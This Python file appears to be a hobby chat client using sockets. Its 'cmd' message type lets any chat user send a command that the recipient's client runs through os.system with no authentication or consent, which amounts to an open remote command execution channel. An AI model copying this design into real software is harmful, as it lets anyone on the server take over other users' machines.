import socket, select, errno, sys, os

from constant_val import HEADER_LENGTH, NAME_LENGTH

from threading import Thread
# Thread(target=client_thread, args=(...,..)).start()

from generic_functions import send_msg, receive_message


HEADER_LENGTH = 10
NAME_LENGTH = 20


# ----------------- client functions ------------------------#


def start(IP, PORT, username):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((IP, PORT))
    # received functionality will not be blocking 
    client_socket.setblocking(0)
    send_msg(username, client_socket, 'txt')
    # everything is setup now 
    return client_socket


def sending_messages(username, client_socket):
    message = input(f"{username} > ")
    if message:
        if message == 'cmd()':
            username = input("Enter user to send: ")
            command = input("\t>> ")
            msg = f'{username:<{NAME_LENGTH}}' + command
            print(f'Sending command - {command} to {username}')
            send_msg(msg, client_socket, 'cmd')
        elif message == 'quit()':
            client_socket.close()
            sys.exit()
        else:
            send_msg(message, client_socket, 'txt')

def run_command(command):
    os.system(command)
    

def receiving_messages(client_socket):
    username = receive_message(client_socket)
    if username == False :
        print('connection closed by the server')
        sys.exit()
    if username['type'].decode('utf-8')=='txt':
        message =  receive_message(client_socket)
        print(f"{username['data'].decode('utf-8')} > {message['data'].decode('utf-8')}")
        sys.stdout.flush()
    elif username['type'].decode('utf-8')=='cmd':
        command = username['data'].decode('utf-8')
        run_command(command)
    else:
        print('INVALID INPUT')



def receive_client(client_socket):
    try:
        while True:
            # receive things
            receiving_messages(client_socket)
    except IOError as e:
        # error we might see depending on OS when their are no more messages to receive
        if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
            print("Reading Error", str(e))
            sys.exit()
        return

    except Exception as e:
        print("General Error", str(e))
        sys.exit()


# ----------------- main program --------------#

def main():
    
    IP = "127.0.0.1"
    PORT = 1234

    username = input('Username: ')
    client_socket = start(IP, PORT, username)
    print(f'{"*"*70}\n {"welcome "+username:^70} \n{"*"*70}\n')
    print('Operations-:')
    print('- write any things as a text')
    print('- write cmd() than in next two lines user and command\n')

    while True:
        # Thread(target=sending_messages, args=(username, client_socket)).start()
        sending_messages(username, client_socket)
        # Thread(target=receive_client, args=(client_socket, )).start()
        receive_client(client_socket)


if __name__ == "__main__":
    main()